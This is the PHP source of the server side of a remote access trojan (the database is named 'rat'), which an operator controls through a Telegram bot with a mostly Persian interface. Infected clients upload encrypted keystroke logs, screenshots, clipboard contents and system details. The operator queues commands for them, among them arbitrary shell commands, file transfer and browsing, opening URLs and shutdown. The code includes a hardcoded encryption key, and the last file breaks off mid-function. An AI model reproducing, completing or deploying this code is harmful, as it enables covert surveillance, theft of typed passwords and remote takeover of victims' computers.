Folder Structure:
├── [FILE] api.php
├── [FILE] config.php
├── [FILE] crypto.php
├── [FILE] database.sql
├── [FILE] import_sql.php
├── [FILE] setWebhook.php
├── [FILE] telegram_handler.php
└── [FILE] utils.php


File Contents:
----------------------------------------
File: .\api.php
----------------------------------------
<?php
require_once 'config.php';
require_once 'crypto.php';
require_once 'utils.php';
require_once 'telegram_handler.php';
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

header('Content-Type: application/json; charset=utf-8');

class ApiHandler
{
    private $pdo;
    private $crypto;

    public function __construct()
    {
        try {
            $this->crypto = new Crypto();
            $this->connect_db();
            $this->ensure_directories();
        } catch (Exception $e) {
            $this->log_error("Constructor Error: " . $e->getMessage());
            http_response_code(500);
            echo json_encode(['error' => 'Initialization failed'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }

    private function connect_db()
    {
        try {
            $this->pdo = new PDO(
                "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
                Config::$DB_USER,
                Config::$DB_PASS,
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
            );
        } catch (PDOException $e) {
            $this->log_error("DB Connection Failed: " . $e->getMessage());
            error_log("Database Error: " . $e->getMessage()); // خطای جدید
            http_response_code(500);
            echo json_encode(['error' => 'Database connection failed'], JSON_UNESCAPED_UNICODE);
            exit;
        }
    }

    private function ensure_directories()
    {
        foreach ([Config::$SCREENSHOT_DIR, Config::$UPLOAD_DIR] as $dir) {
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
        }
    }


    public function handle_request()
    {
        $raw = file_get_contents('php://input');
        $json = json_decode($raw, true);

        if (isset($json['update_id'])) {
            file_put_contents(Config::$WEBHOOK_LOG, date('c') . " TELEGRAM: $raw\n", FILE_APPEND);
            try {
                TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $json);
            } catch (Exception $e) {
                $this->log_error("Error in TelegramHandler: " . $e->getMessage());
                http_response_code(500);
                echo json_encode(['error' => 'TelegramHandler error'], JSON_UNESCAPED_UNICODE);
            }
            return;
        }
        $action = $_POST['action'] ?? $_GET['action'] ?? '';
        $this->log_webhook();


        if ($action === 'telegram_webhook') {
            $update = json_decode(file_get_contents('php://input'), true);
            TelegramHandler::handle_telegram_update($this->pdo, $this->crypto, $update);
            return;
        }

        if (!$this->verify_token()) {
            http_response_code(403);
            echo json_encode(['error' => 'Invalid token'], JSON_UNESCAPED_UNICODE);
            return;
        }

        switch ($action) {
            case 'upload_data':
                $this->handle_upload();
                break;
            case 'get_commands':
                $this->handle_get_commands();
                break;
            case 'command_response':
                $this->handle_command_response();
                break;
            case 'file_manager':
                $this->handle_file_manager();
                break;
            default:
                http_response_code(400);
                echo json_encode(['error' => 'Invalid action'], JSON_UNESCAPED_UNICODE);
        }
    }

    private function verify_token()
    {
        return isset($_POST['token']) && $_POST['token'] === Config::$SECRET_TOKEN;
    }

    private function log_webhook()
    {
        $data = [
            'time' => date('Y-m-d H:i:s'),
            'method' => $_SERVER['REQUEST_METHOD'],
            'post' => $_POST,
            'get' => $_GET,
            'input' => file_get_contents('php://input')
        ];
        file_put_contents(Config::$WEBHOOK_LOG, json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL, FILE_APPEND);
    }

    private function handle_upload()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $keystrokes = $this->crypto->decrypt($_POST['keystrokes'] ?? '');
        $system_info = json_decode($this->crypto->decrypt($_POST['system_info'] ?? ''), true);
        $screenshot = $_FILES['screenshot'] ?? null;

        $screenshot_path = null;
        if ($screenshot && $screenshot['error'] === UPLOAD_ERR_OK) {
            $screenshot_path = Config::$SCREENSHOT_DIR . time() . '_' . $client_id . '.png';
            move_uploaded_file($screenshot['tmp_name'], $screenshot_path);
        }

        $this->pdo->prepare("
            INSERT INTO client_data (client_id, keystrokes, screenshot_path, system_info, received_at)
            VALUES (?, ?, ?, ?, NOW())
        ")->execute([$client_id, $keystrokes, $screenshot_path, json_encode($system_info)]);

        $this->pdo->prepare("
            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
            VALUES (?, NOW(), ?, ?)
            ON DUPLICATE KEY UPDATE last_seen = NOW(), ip_address = ?, last_ip = ?
        ")->execute([$client_id, $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown', $system_info['ip_address'] ?? 'unknown']);

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_get_commands()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');

        // افزودن بخش به‌روزرسانی وضعیت آنلاین کاربر
        $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
        $this->pdo->prepare("
            INSERT INTO users (client_id, last_seen, ip_address, last_ip)
            VALUES (?, NOW(), ?, ?)
            ON DUPLICATE KEY UPDATE 
                last_seen = NOW(), 
                ip_address = VALUES(ip_address),
                last_ip = VALUES(last_ip)
        ")->execute([$client_id, $ip_address, $ip_address]);

        // بقیه کد موجود
        $stmt = $this->pdo->prepare("
        SELECT id, command, created_at 
        FROM commands
        WHERE client_id = ? AND status = 'pending'
        ORDER BY created_at DESC
        LIMIT 10
    ");
        $stmt->execute([$client_id]);
        $commands = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $this->pdo->prepare("UPDATE commands SET status = 'sent' WHERE client_id = ? AND status = 'pending'")
            ->execute([$client_id]);

        echo json_encode([
            'commands' => array_map(function ($cmd) {
                return [
                    'id' => $cmd['id'],
                    'command' => $cmd['command'],
                    'type' => 'encrypted_command' // افزودن فیلد type
                ];
            }, $commands)
        ], JSON_UNESCAPED_UNICODE);
    }
    private function handle_command_response()
    {
        $command_id = Utils::sanitize_input($_POST['command_id'] ?? '');
        $result = json_decode($this->crypto->decrypt($_POST['result'] ?? ''), true);

        $this->pdo->prepare("
            UPDATE commands SET response = ?, status = 'completed', completed_at = NOW()
            WHERE id = ?
        ")->execute([json_encode($result), $command_id]);

        $chat_id = Utils::get_admin_chat_id($this->pdo);
        if ($chat_id) {
            TelegramHandler::send_telegram_message(
                $chat_id,
                "Command #$command_id executed:\n" . json_encode($result, JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT),
                ['parse_mode' => 'HTML']
            );
        }

        echo json_encode(['status' => 'success'], JSON_UNESCAPED_UNICODE);
    }

    private function handle_file_manager()
    {
        $client_id = Utils::sanitize_input($_POST['client_id'] ?? '');
        $params = json_decode($this->crypto->decrypt($_POST['params'] ?? ''), true);
        $command = [
            'type' => 'file_operation',
            'params' => $params
        ];

        $stmt = $this->pdo->prepare("
            INSERT INTO commands (client_id, command, status, created_at)
            VALUES (?, ?, 'pending', NOW())
        ");
        $stmt->execute([$client_id, $this->crypto->encrypt(json_encode($command))]);

        echo json_encode(['status' => 'success', 'command_id' => $this->pdo->lastInsertId()], JSON_UNESCAPED_UNICODE);
    }

    private function log_error($message)
    {
        Utils::log_error($message);
    }
}

$api = new ApiHandler();
$api->handle_request();


----------------------------------------
File: .\config.php
----------------------------------------
<?php
class Config {
    // Connection Settings
    public static $SERVER_URL = "https://example.com/api.php"; // آدرس سرور
    public static $BOT_TOKEN = ""; // توکن بات تلگرام
    public static $SECRET_TOKEN = "1"; // توکن مخفی برای کلاینت‌ها
    public static $ENCRYPTION_KEY = "nTds2GHvEWeOGJibjZuaf8kY5T5YWyfMx4J3B1NA0Jo="; // کلید رمزنگاری (base64)
    public static $ADMIN_CHAT_ID = "";
    public static $ONLINE_THRESHOLD = 300;
    public static $WEBHOOK_SECRET = "";

    
    // Database Settings
    public static $DB_HOST = "localhost";
    public static $DB_NAME = "rat";
    public static $DB_USER = "root";
    public static $DB_PASS = "";
    
    // File Paths
    public static $SCREENSHOT_DIR = __DIR__ . "/screenshots/";
    public static $UPLOAD_DIR = __DIR__ . "/uploads/";
    public static $ERROR_LOG = __DIR__ . "/log/error.log";
    public static $WEBHOOK_LOG = __DIR__ . "/log/webhook.log";
    public static $TELEGRAM_LOG = __DIR__ . "/log/telegram_update.log";
    
    // Other Settings
    public static $COMMAND_TIMEOUT = 10; // ثانیه
    public static $MAX_LOG_SIZE = 1024 * 1024; // 1MB
}
?>

----------------------------------------
File: .\crypto.php
----------------------------------------
<?php
require_once 'config.php';

class Crypto {
    private $key;

    public function __construct() {
        $this->key = base64_decode(Config::$ENCRYPTION_KEY);
        $this->validate_key();
    }

    private function validate_key() {
        if (strlen($this->key) !== 32) {
            throw new Exception("Invalid encryption key length");
        }
    }

    public function encrypt($data) {
        $iv = openssl_random_pseudo_bytes(16);
        $ciphertext = openssl_encrypt(
            is_array($data) ? json_encode($data) : $data,
            'AES-256-CBC',
            $this->key,
            OPENSSL_RAW_DATA,
            $iv
        );
        return base64_encode($ciphertext) . '::' . base64_encode($iv);
    }

    public function decrypt($data) {
        if (empty($data) || !is_string($data) || !strpos($data, '::')) {
            throw new Exception("Invalid encrypted data format");
        }

        list($ciphertext_b64, $iv_b64) = explode('::', $data);
        $ciphertext = base64_decode($ciphertext_b64);
        $iv = base64_decode($iv_b64);

        $plaintext = openssl_decrypt(
            $ciphertext,
            'AES-256-CBC',
            $this->key,
            OPENSSL_RAW_DATA,
            $iv
        );

        if ($plaintext === false) {
            throw new Exception("Decryption failed");
        }

        return $plaintext;
    }
}
?>

----------------------------------------
File: .\database.sql
----------------------------------------
CREATE TABLE client_data (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    keystrokes TEXT,
    screenshot_path VARCHAR(255),
    system_info JSON,
    received_at DATETIME NOT NULL,
    INDEX idx_client_id (client_id)
);

CREATE TABLE users (
    client_id VARCHAR(32) PRIMARY KEY,
    last_seen DATETIME NOT NULL,
    ip_address VARCHAR(45),
    last_ip VARCHAR(45)
);

CREATE TABLE commands (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    command TEXT NOT NULL,
    response JSON,
    status ENUM('pending', 'sent', 'completed') NOT NULL DEFAULT 'pending',
    created_at DATETIME NOT NULL,
    completed_at DATETIME,
    INDEX idx_client_id_status (client_id, status)
);

CREATE TABLE allowed_users (
    chat_id BIGINT PRIMARY KEY,
    selected_client_id VARCHAR(32) NULL
);

CREATE TABLE user_typelogs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    chat_id BIGINT NOT NULL,
    keystrokes TEXT,
    created_at DATETIME NOT NULL
);

CREATE TABLE clipboard_logs (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    client_id VARCHAR(32) NOT NULL,
    content TEXT,
    created_at DATETIME NOT NULL,
    INDEX idx_client_id (client_id)
);

INSERT INTO allowed_users (chat_id) VALUES ('YOUR_ADMIN_CHAT_ID');

----------------------------------------
File: .\import_sql.php
----------------------------------------
<?php
// import_sql.php

require_once 'config.php';

try {
    $pdo = new PDO(
        "mysql:host=" . Config::$DB_HOST . ";dbname=" . Config::$DB_NAME . ";charset=utf8mb4",
        Config::$DB_USER,
        Config::$DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        ]
    );

    $sqlFile = __DIR__ . '/database.sql';

    if (!file_exists($sqlFile)) {
        throw new Exception("فایل database.sql پیدا نشد.");
    }

    $sqlContent = file_get_contents($sqlFile);

    $pdo->exec($sqlContent);

    echo "✅ وارد کردن فایل SQL با موفقیت انجام شد.";
} catch (PDOException $e) {
    echo "❌ خطای پایگاه داده: " . $e->getMessage();
} catch (Exception $e) {
    echo "❌ خطا: " . $e->getMessage();
}


----------------------------------------
File: .\setWebhook.php
----------------------------------------
<?php
$token  = 'YOUR_NEW_TOKEN';
$webhookUrl    = 'https://your.domain.com/api.php';
$secretToken  = 'YOUR_SECRET_TOKEN';

$params = [
    'url'                   => $webhookUrl,
    'secret_token'          => $secretToken,
    'drop_pending_updates'  => true,
    // 'certificate'        => new CURLFile('/path/to/your/public.pem'), // اگر گواهی سفارشی دارین
];

$ch = curl_init("https://api.telegram.org/bot{$token}/setWebhook");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);

echo $response;  // JSON با نتیجه‌ی عملیات


----------------------------------------
File: .\telegram_handler.php
----------------------------------------
<?php
require_once 'config.php';
require_once 'utils.php';

class TelegramHandler
{
    public static function handle_telegram_update($pdo, $crypto, $update)
    {
        try {
            $chat_id = $update['message']['chat']['id'] ?? $update['callback_query']['from']['id'] ?? 0;

            if (!self::is_authorized($chat_id)) {
                self::send_telegram_message($chat_id, "Access denied. Only the authorized admin can use this bot.");
                self::log_update($update, "Unauthorized access attempt by chat_id: $chat_id");
                return;
            }

            if (isset($update['callback_query'])) {
                self::process_callback($pdo, $crypto, $update['callback_query']);
            } elseif (isset($update['message'])) {
                self::process_message($pdo, $crypto, $update['message']);
            }

            self::log_update($update, "Update processed successfully");
        } catch (Exception $e) {
            Utils::log_error("Error in handle_telegram_update: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred. Please check the logs.");
        }
    }

    private static function is_authorized($chat_id)
    {
        return $chat_id == Config::$ADMIN_CHAT_ID;
    }

    private static function process_message($pdo, $crypto, $message)
    {
        try {
            $chat_id = $message['chat']['id'];
            $text = $message['text'] ?? '';

            if (!empty($text)) {
                $stmt = $pdo->prepare("
                    INSERT INTO user_typelogs (chat_id, keystrokes, created_at)
                    VALUES (?, ?, NOW())
                ");
                $stmt->execute([$chat_id, $text]);
            }

            if (isset($message['document'])) {
                self::handle_file_upload($pdo, $crypto, $message);
                return;
            }

            switch ($text) {
                case '/start':
                    self::show_client_list($pdo, $chat_id);
                    break;
                case '/help': // اضافه کردن دستور help
                    self::show_help_menu($chat_id);
                    break;            
                case '/cmd':
                    self::send_telegram_message($chat_id, "⚠️ از فرمت زیر استفاده کنید:\n/cmd <دستور>");
                    break;
                case '/screens':
                    self::show_screenshots($pdo, $chat_id);
                    break;
                case '/logs':
                    self::show_logs($chat_id);
                    break;
                case '/browse':
                    self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
                        'action' => 'list',
                        'path' => '/' // اضافه کردن پارامتر path
                    ]);
                    break;
                case '/get-info':
                    self::send_command($pdo, $crypto, $chat_id, 'system_info', []);
                    break;
                case '/go':
                    self::send_telegram_message($chat_id, "⚠️ از فرمت زیر استفاده کنید:\n/go <URL>");
                    break;
                case '/users':
                    self::show_client_list($pdo, $chat_id);
                    break;
                case '/shutdown':
                case '/restart':
                case '/sleep':
                case '/signout':
                    self::send_command($pdo, $crypto, $chat_id, 'system_command', ['command' => substr($text, 1)]);
                    break;
                case '/startup':
                case '/tasks':
                    self::send_command($pdo, $crypto, $chat_id, 'process_management', ['action' => $text === '/startup' ? 'list' : 'list']);
                    break;
                default:
                    if (strpos($text, '/cmd ') === 0) {
                        self::send_command($pdo, $crypto, $chat_id, 'raw_command', ['command' => substr($text, 5)]);
                    } elseif (strpos($text, '/go ') === 0) {
                        self::send_command($pdo, $crypto, $chat_id, 'open_url', ['url' => substr($text, 4)]);
                    } else {
                        self::send_telegram_message($chat_id, "Unknown command. Use /start to begin.");
                    }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in process_message: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while processing the message.");
        }
    }

    private static function show_help_menu($chat_id) {
        $help_text = "🎮 **راهنمای دستورات**\n\n"
            ."🔍 `/start` - نمایش لیست دستگاهها\n"
            ."📂 `/browse` - مرور فایلهای دستگاه\n"
            ."🌐 `/go <URL>` - باز کردن آدرس اینترنتی\n"
            ."💻 `/cmd <command>` - اجرای دستور مستقیم\n"
            ."📸 `/screens` - مشاهده اسکرین‌شاتها\n"
            ."📝 `/logs` - مشاهده لاگهای خطا\n"
            ."⚙️ `/get-info` - اطلاعات سیستم\n"
            ."🔌 `/shutdown` - خاموش کردن دستگاه\n"
            ."🔄 `/restart` - راه‌اندازی مجدد\n"
            ."❓ `/help` - نمایش این راهنما";
    
        self::send_telegram_message(
            $chat_id,
            $help_text,
            ['parse_mode' => 'Markdown']
        );
    }
    

    private static function process_callback($pdo, $crypto, $callback)
    {
        try {
            $chat_id = $callback['from']['id'];
            $data = $callback['data'];
            $message_id = $callback['message']['message_id'] ?? null;

            // دریافت client_id انتخابی کاربر
            $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
            $stmt->execute([$chat_id]);
            $selected_client = $stmt->fetch(PDO::FETCH_ASSOC);
            $client_id = $selected_client['selected_client_id'] ?? null;

            // پردازش انواع callback_data
            if (strpos($data, 'select_client:') === 0) {
                $client_id = substr($data, 14);
                $stmt = $pdo->prepare("UPDATE allowed_users SET selected_client_id = ? WHERE chat_id = ?");
                $stmt->execute([$client_id, $chat_id]);
                self::show_access_menu($pdo, $chat_id, $client_id);
            } elseif (strpos($data, 'action:raw_cmd:') === 0) {
                $client_id = substr($data, 14);
                self::send_telegram_message(
                    $chat_id,
                    "🔧 لطفا دستور مورد نظر را به فرمت زیر ارسال کنید:\n/cmd <دستور>",
                    ['parse_mode' => 'Markdown']
                );
            } elseif (strpos($data, 'action:') === 0) {
                $parts = explode(':', $data);
                $action = $parts[1] ?? null;
                $client_id = $parts[2] ?? null;

                if (!$client_id) {
                    self::send_telegram_message($chat_id, "⚠️ دستگاه انتخاب نشده!");
                    return;
                }

                $actions = [
                    'get_info' => [
                        'type' => 'system_info',
                        'text' => "در حال دریافت اطلاعات سیستم...",
                        'params' => []
                    ],
                    'browse' => [
                        'type' => 'file_operation',
                        'text' => "در حال دریافت لیست فایل‌ها...",
                        'params' => ['action' => 'list']
                    ],
                    'shutdown' => [
                        'type' => 'system_command',
                        'text' => "در حال خاموش کردن دستگاه...",
                        'params' => ['command' => 'shutdown']
                    ],
                    'restart' => [
                        'type' => 'system_command',
                        'text' => "در حال راه‌اندازی مجدد دستگاه...",
                        'params' => ['command' => 'restart']
                    ],
                    'clipboard' => [
                        'type' => 'clipboard_history',
                        'text' => "در حال دریافت تاریخچه کلیپبورد...",
                        'params' => []
                    ],
                    'keystrokes' => [
                        'type' => 'keystroke_history',
                        'text' => "در حال دریافت تاریخچه کیلاگر...",
                        'params' => []
                    ],
                    'screenshot' => [
                        'type' => 'capture_screenshot',
                        'text' => "در حال گرفتن اسکرین‌شات...",
                        'params' => []
                    ],
                    'process_mgmt' => [
                        'type' => 'process_management',
                        'text' => "در حال دریافت لیست پردازش‌ها...",
                        'params' => ['action' => 'list']
                    ],
                    'open_url' => [
                        'type' => 'open_url',
                        'text' => "لطفا URL را وارد کنید:",
                        'params' => []
                    ]
                ];

                if ($action && array_key_exists($action, $actions)) {
                    // نمایش پیام وضعیت
                    self::send_telegram_message($chat_id, "⏳ " . $actions[$action]['text']);

                    // ارسال دستور به کلاینت
                    self::send_command(
                        $pdo,
                        $crypto,
                        $chat_id,
                        $actions[$action]['type'],
                        array_merge($actions[$action]['params'], ['client_id' => $client_id])
                    );
                } else {
                    self::send_telegram_message($chat_id, "⚠️ دستور نامعتبر!");
                }
            } elseif (strpos($data, 'view_old_data:') === 0) {
                $client_id = substr($data, 14);
                self::show_old_data($pdo, $chat_id, $client_id);
            } elseif ($data === 'view_clipboard_logs') {
                if ($client_id) {
                    self::show_clipboard_history($pdo, $chat_id, $client_id);
                }
            } else {
                self::send_telegram_message($chat_id, "⚠️ دستور نامشخص!");
            }

            // حذف پیام قبلی برای تجربه کاربری بهتر
            if ($message_id) {
                self::delete_telegram_message($chat_id, $message_id);
            }
        } catch (Exception $e) {
            Utils::log_error("Error in process_callback: " . $e->getMessage());
            self::send_telegram_message($chat_id, "⚠️ خطا در پردازش درخواست!");
        }
    }

    // تابع کمکی برای حذف پیام
    private static function delete_telegram_message($chat_id, $message_id)
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/deleteMessage";
            $data = [
                'chat_id' => $chat_id,
                'message_id' => $message_id
            ];

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_RETURNTRANSFER => true
            ]);
            curl_exec($ch);
            curl_close($ch);
        } catch (Exception $e) {
            Utils::log_error("Error deleting message: " . $e->getMessage());
        }
    }

    private static function show_client_list($pdo, $chat_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT 
                    u.client_id, 
                    u.last_seen,
                    COUNT(cd.id) AS log_count
                FROM users u
                LEFT JOIN client_data cd ON u.client_id = cd.client_id
                GROUP BY u.client_id
            ");
            $stmt->execute();
            $clients = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!$clients) {
                self::send_telegram_message($chat_id, "📭 هیچ دستگاهی یافت نشد");
                return;
            }

            $keyboard = ['inline_keyboard' => []];
            $now = time();

            foreach ($clients as $client) {
                $last_seen_time = strtotime($client['last_seen']);
                $is_online = ($now - $last_seen_time) <= Config::$ONLINE_THRESHOLD;

                $emoji = $is_online ? "🟢" : "🔴";
                $status = $is_online ? "آنلاین" : "آفلاین";
                $log_count = $client['log_count'];

                $text = "{$emoji} {$client['client_id']} ({$status}) 📚 {$log_count} لاگ";

                $keyboard['inline_keyboard'][] = [[
                    'text' => $text,
                    'callback_data' => 'select_client:' . $client['client_id']
                ]];
            }

            // افزودن دکمه مشاهده لاگ‌های کلیپبورد
            $keyboard['inline_keyboard'][] = [[
                'text' => "📋 مشاهده کلیپبوردهای ذخیره شده",
                'callback_data' => 'view_clipboard_logs'
            ]];

            self::send_telegram_message(
                $chat_id,
                "📱 لیست دستگاهها:\nانتخاب کن یا لاگها رو ببین 👇",
                ['reply_markup' => $keyboard]
            );
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "⚠️ خطا در دریافت لیست دستگاهها");
        }
    }

    private static function show_clipboard_history($pdo, $chat_id, $client_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT content, created_at 
                FROM clipboard_logs
                WHERE client_id = ?
                ORDER BY created_at DESC
                LIMIT 10
            ");
            $stmt->execute([$client_id]);
            $logs = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if ($logs) {
                $message = "📋 تاریخچه کلیپبورد برای {$client_id}:\n\n";
                foreach ($logs as $log) {
                    $message .= "⏰ " . $log['created_at'] . "\n";
                    $message .= "📝 " . substr($log['content'], 0, 100) . "...\n\n";
                }
            } else {
                $message = "📭 هیچ لاگ کلیپبوردی برای {$client_id} پیدا نشد";
            }

            self::send_telegram_message($chat_id, $message);
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "⚠️ خطا در دریافت تاریخچه کلیپبورد");
        }
    }

    private static function show_old_data($pdo, $chat_id, $client_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT * FROM client_data 
                WHERE client_id = ? 
                ORDER BY received_at DESC 
                LIMIT 1
            ");
            $stmt->execute([$client_id]);
            $data = $stmt->fetch(PDO::FETCH_ASSOC);

            if ($data) {
                $message = "اطلاعات قدیمی کاربر $client_id:\n";
                $message .= "کی‌لاگر: " . ($data['keystrokes'] ?? 'نداره') . "\n";
                $message .= "اطلاعات سیستم: " . json_encode($data['system_info'] ?? [], JSON_PRETTY_PRINT) . "\n";
                $message .= "زمان دریافت: " . $data['received_at'] . "\n";
                self::send_telegram_message($chat_id, $message);
            } else {
                self::send_telegram_message($chat_id, "هیچ اطلاعاتی برای $client_id پیدا نشد.");
            }
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "خطا در نمایش اطلاعات قدیمی.");
        }
    }

    private static function show_access_menu($pdo, $chat_id, $client_id)
    {
        try {
            $keyboard = [
                'inline_keyboard' => [
                    [
                        ['text' => "📊 اطلاعات سیستم", 'callback_data' => 'action:get_info:' . $client_id],
                        ['text' => "📂 مدیریت فایل‌ها", 'callback_data' => 'action:file_manager:' . $client_id]
                    ],
                    [
                        ['text' => "⌨️ تاریخچه کیلاگر", 'callback_data' => 'action:keystrokes:' . $client_id],
                        ['text' => "📋 تاریخچه کلیپبورد", 'callback_data' => 'action:clipboard:' . $client_id]
                    ],
                    [
                        ['text' => "🖥️ مدیریت پردازش‌ها", 'callback_data' => 'action:process_mgmt:' . $client_id],
                        ['text' => "🌐 بازکردن URL", 'callback_data' => 'action:open_url:' . $client_id]
                    ],
                    [
                        ['text' => "🛑 خاموش کردن", 'callback_data' => 'action:shutdown:' . $client_id],
                        ['text' => "🔄 راه‌اندازی مجدد", 'callback_data' => 'action:restart:' . $client_id]
                    ],
                    [
                        ['text' => "📸 اسکرین‌شات جدید", 'callback_data' => 'action:screenshot:' . $client_id],
                        ['text' => "📝 اجرای دستور", 'callback_data' => 'action:raw_cmd:' . $client_id]
                    ]
                ]
            ];

            self::send_telegram_message(
                $chat_id,
                "🎮 **کنترل کامل دستگاه**\n\n🆔 شناسه دستگاه: `{$client_id}`\nانتخاب عملیات:",
                ['reply_markup' => $keyboard, 'parse_mode' => 'Markdown']
            );
        } catch (Exception $e) {
            Utils::log_error("Error in show_access_menu: " . $e->getMessage());
            self::send_telegram_message($chat_id, "⚠️ خطا در نمایش منوی دستورات");
        }
    }

    private static function show_keystroke_history($pdo, $chat_id, $client_id)
    {
        try {
            $stmt = $pdo->prepare("
                SELECT keystrokes, received_at 
                FROM client_data
                WHERE client_id = ?
                ORDER BY received_at DESC
                LIMIT 5
            ");
            $stmt->execute([$client_id]);
            $logs = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if ($logs) {
                $message = "⌨️ تاریخچه کیلاگر برای {$client_id}:\n\n";
                foreach ($logs as $log) {
                    $message .= "⏰ " . $log['received_at'] . "\n";
                    $message .= "🔠 " . substr($log['keystrokes'], 0, 100) . "...\n\n";
                }
            } else {
                $message = "📭 هیچ تاریخچه کیلاگری برای {$client_id} پیدا نشد";
            }

            self::send_telegram_message($chat_id, $message);
        } catch (Exception $e) {
            self::send_telegram_message($chat_id, "⚠️ خطا در دریافت تاریخچه کیلاگر");
        }
    }

    private static function show_screenshots($pdo, $chat_id)
    {
        try {
            $stmt = $pdo->prepare("SELECT screenshot_path FROM client_data WHERE screenshot_path IS NOT NULL ORDER BY received_at DESC LIMIT 5");
            $stmt->execute();
            $screenshots = $stmt->fetchAll(PDO::FETCH_ASSOC);

            if (!$screenshots) {
                self::send_telegram_message($chat_id, "No screenshots found.");
                return;
            }

            foreach ($screenshots as $screenshot) {
                if (file_exists($screenshot['screenshot_path'])) {
                    self::send_telegram_message($chat_id, null, ['photo' => curl_file_create($screenshot['screenshot_path'])]);
                } else {
                    Utils::log_error("Screenshot file not found: " . $screenshot['screenshot_path']);
                }
            }
        } catch (Exception $e) {
            Utils::log_error("Error in show_screenshots: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while fetching screenshots.");
        }
    }

    private static function show_logs($chat_id)
    {
        try {
            if (file_exists(Config::$ERROR_LOG)) {
                $logs = file_get_contents(Config::$ERROR_LOG);
                self::send_telegram_message($chat_id, "Error logs:\n" . htmlspecialchars($logs));
            } else {
                self::send_telegram_message($chat_id, "No logs found.");
            }
        } catch (Exception $e) {
            Utils::log_error("Error in show_logs: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while fetching logs.");
        }
    }

    private static function send_command($pdo, $crypto, $chat_id, $type, $params)
    {
        try {
            $client_id = $params['client_id'] ?? null;
            if (!$client_id) {
                $stmt = $pdo->prepare("SELECT selected_client_id FROM allowed_users WHERE chat_id = ?");
                $stmt->execute([$chat_id]);
                $client_id = $stmt->fetchColumn();
                if (!$client_id) {
                    self::send_telegram_message($chat_id, "No client selected. Please select a client first using /start.");
                    return;
                }
            }
            $client_id = Utils::sanitize_input($client_id);
            $command = ['type' => $type, 'params' => $params];

            $stmt = $pdo->prepare("
                INSERT INTO commands (client_id, command, status, created_at)
                VALUES (?, ?, 'pending', NOW())
            ");
            $stmt->execute([$client_id, $crypto->encrypt(json_encode($command))]);

            self::send_telegram_message($chat_id, "Command sent to client $client_id.");
        } catch (Exception $e) {
            Utils::log_error("Error in send_command: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while sending the command.");
        }
    }

    private static function handle_file_upload($pdo, $crypto, $message)
    {
        try {
            $chat_id = $message['chat']['id'];
            $file_id = $message['document']['file_id'];
            $file = self::get_telegram_file($file_id);

            $file_path = Config::$UPLOAD_DIR . $message['document']['file_name'];
            file_put_contents($file_path, $file);

            self::send_command($pdo, $crypto, $chat_id, 'file_operation', [
                'action' => 'upload',
                'path' => $file_path
            ]);
        } catch (Exception $e) {
            Utils::log_error("Error in handle_file_upload: " . $e->getMessage());
            self::send_telegram_message($chat_id, "An error occurred while uploading the file.");
        }
    }

    private static function get_telegram_file($file_id)
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/getFile?file_id=$file_id";
            $response = json_decode(file_get_contents($url), true);
            if (!$response['ok']) {
                throw new Exception("Failed to get Telegram file: " . $response['description']);
            }
            $file_path = $response['result']['file_path'];
            $file_content = file_get_contents("https://api.telegram.org/file/bot" . Config::$BOT_TOKEN . "/$file_path");
            if ($file_content === false) {
                throw new Exception("Failed to download Telegram file.");
            }
            return $file_content;
        } catch (Exception $e) {
            Utils::log_error("Error in get_telegram_file: " . $e->getMessage());
            throw $e;
        }
    }

    public static function send_telegram_message($chat_id, $text, $options = [])
    {
        try {
            $url = "https://api.telegram.org/bot" . Config::$BOT_TOKEN . "/" . (isset($options['photo']) ? 'sendPhoto' : 'sendMessage');
            $data = [
                'chat_id' => $chat_id,
                'text' => $text,
                'parse_mode' => 'HTML'
